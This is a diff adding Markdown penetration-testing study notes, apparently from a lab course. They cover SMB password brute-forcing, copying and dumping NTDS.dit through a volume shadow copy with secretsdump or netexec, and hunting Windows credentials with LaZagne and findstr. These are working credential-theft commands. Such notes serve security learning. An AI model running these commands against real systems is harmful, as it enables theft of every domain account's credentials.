@@ -399,3 +399,158 @@ bob
 netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
 
+*This kind of attack will leave a huge event log because it's very loud*
+
+![[nxc brute-force event-log.png]]
+
+## Capturing NTDS.dit
+
+`NT Directory Service (NTDS)` is the directory service used with AD to find & organize network resources. `NTDS.dit` is stored in `%systemroot%/ntds` on the domain controller in the **forest**.
+
+`.dit` means directory info tree.
+
+This file is the primary database file associated with AD and stores all domain usernames, hashes, and other critical schema info.
+
+If we captured this file, all AD accounts on the domain are compromised.
+
+### Local Group Membership
+
+We can check for local group membership using:
+
+```powershell
+net localgroup
+```
+
+To make a copy of the `NTDS.dit` we need **Local Admin** or **Domain Admin** membership, or an equivalent rights.
+
+### User Account Privileges
+
+```powershell title="Command Example"
+net user bwilliamson
+```
+
+### Create Shadow Copy of `C:`
+
+We can use `vssadmin (Volume Shadow Copy)` to create a shadow copy of the drive without the need of bringing any software of host down:
+
+```powershell
+vssadmin CREATE SHADOW /For=C:
+```
+
+![[vssadmin.png]]
+
+### Copying `NTDS.dit` from the VSS
+
+```powershell
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+
+```ad-important
+As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.
+```
+
+### Extracting Hashes from `NTDS.dit`
+
+```sh
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+```
+
+### A faster method: Using NetExec to capture NTDS.dit
+
+```sh
+netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+```
+
+### Next Steps
+
+We can crack hashes with `hashcat`, or `Pass the Hash (PtH)`.
+
+# Credential Hunting in Windows
+
+**Credentials hunting** is the process of conducting detailed searches across the filesystem and various apps to discover credentials.
+
+## Search Cetnric
+
+#### Key terms to search for
+
+- Passwords
+- Passphrases
+- Keys
+- Username
+- User account
+- Creds
+- Users
+- Passkeys
+- configuration
+- dbcredential
+- dbpassword
+- pwd
+- Login
+- Credentials
+
+#### LaZagne
+
+We can use third-party tools like `LaZagne` to quickly discover credentials stored in web browsers or that installed applications may insecurely store.
+
+Common modules in `LaZagne`:
+
+|Module|Description|
+|---|---|
+|browsers|Extracts passwords from various browsers including Chromium, Firefox, Microsoft Edge, and Opera|
+|chats|Extracts passwords from various chat applications including Skype|
+|mails|Searches through mailboxes for passwords including Outlook and Thunderbird|
+|memory|Dumps passwords from memory, targeting KeePass and LSASS|
+|sysadmin|Extracts passwords from the configuration files of various sysadmin tools like OpenVPN and WinSCP|
+|windows|Extracts Windows-specific credentials targeting LSA secrets, Credential Manager, and more|
+|wifi|Dumps WiFi credentials|
+
+```ad-note
+Web browsers are one of the most interesting places to search for credentials in. In most browsers, credentials are stored encrypted. However, many tools can be used for decryption such as [firefox_decrypt](https://github.com/unode/firefox_decrypt) and [decrypt-chrome-passwords](https://github.com/ohyicong/decrypt-chrome-passwords).
+```
+
+**Example Usage:**
+
+```powershell
+start LaZagne.exe all
+```
+
+#### findstr
+
+We can use the built-in search tool `findstr` to search for different patterns of files across many filetypes
+
+```powershell
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+## Additional Considerations
+
+Here are some other places we should keep in mind when credential hunting:
+
+- Passwords in Group Policy in the SYSVOL share
+- Passwords in scripts in the SYSVOL share
+- Password in scripts on IT shares
+- Passwords in `web.config` files on dev machines and IT shares
+- Password in `unattend.xml`
+- Passwords in the AD user or computer description fields
+- KeePass databases (if we are able to guess or crack the master password)
+- Found on user systems and shares
+- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)
+
+
+```ad-tldr
+Remember to check for saved credentials in daily used applications like WinSCP, Session Management softwares.
+
+---
+
+If you're on a host that has IDEs or Text-Editors on it, check them, you might find interesting opened files.
+
+---
+
+Don't forget to go through the file system, you may find some credentials.
+
+---
+
+Remember to use `LaZagne`
+```
+
